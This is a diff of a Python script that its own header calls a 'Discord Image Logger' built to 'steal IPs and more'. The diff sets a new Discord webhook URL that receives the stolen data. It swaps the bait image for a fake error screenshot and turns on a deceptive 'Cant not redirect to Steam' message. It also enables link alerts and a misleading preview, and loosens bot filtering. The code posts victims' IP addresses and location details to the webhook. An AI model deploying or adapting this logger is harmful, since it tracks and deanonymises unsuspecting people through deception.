@@ -8,12 +8,12 @@ import traceback, requests, base64, httpagentparser
 __app__ = "Discord Image Logger"
 __description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
 __version__ = "v2.0"
-__author__ = "TSJohnpork"
+__author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1330982655722000435/_ZhFTuLKSuM9snwtMHBXceNcPHjmquhHM556GjWvpp1lUtFuna5md2rQid_ZqCiyu98o",
-    "image": "https://blog.pcrisk.com/images/stories/blog/2023/steam-error-code-118/steam-error-code-118-v2.jpg", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1335010179560771677/fz_GbDQLraHZluuzt4KXhkBgKbiwd3f9GEEYAWqkaB1SB110wBXdIke9FzQFFgx19NCu",
+    "image": "https://www.bugsfighter.com/wp-content/uploads/2022/12/google-meet-error-502.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -27,8 +27,8 @@ config = {
     "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
-        "doMessage":False, # Enable the custom message?
-        "message": "Steam Unable to conent. ", # Message to show
+        "doMessage": True, # Enable the custom message?
+        "message": "Cant not redirect to https://store.steampowered.com/ ", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
@@ -37,10 +37,10 @@ config = {
                 # 1 = Don't ping when a VPN is suspected
                 # 2 = Don't send an alert when a VPN is suspected
 
-    "linkAlerts": False, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
-    "buggedImage": False, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)
+    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
+    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)
 
-    "antiBot": 4, # Prevents bots from triggering the alert
+    "antiBot": 1, # Prevents bots from triggering the alert
                 # 0 = No Anti-Bot
                 # 1 = Don't ping when it's possibly a bot
                 # 2 = Don't ping when it's 100% a bot
@@ -51,7 +51,7 @@ config = {
     # REDIRECTION #
     "redirect": {
         "redirect": False, # Redirect to a webpage?
-        "page": "https://store.steampowered.com/" # Link to the webpage to redirect to 
+        "page": "https://your-link.here" # Link to the webpage to redirect to 
     },
 
     # Please enter all values in correct format. Otherwise, it may break.
@@ -77,7 +77,7 @@ def botCheck(ip, useragent):
 def reportError(error):
     requests.post(config["webhook"], json = {
     "username": config["username"],
-    "content": "hey chat",
+    "content": "@everyone",
     "embeds": [
         {
             "title": "Image Logger - Error",
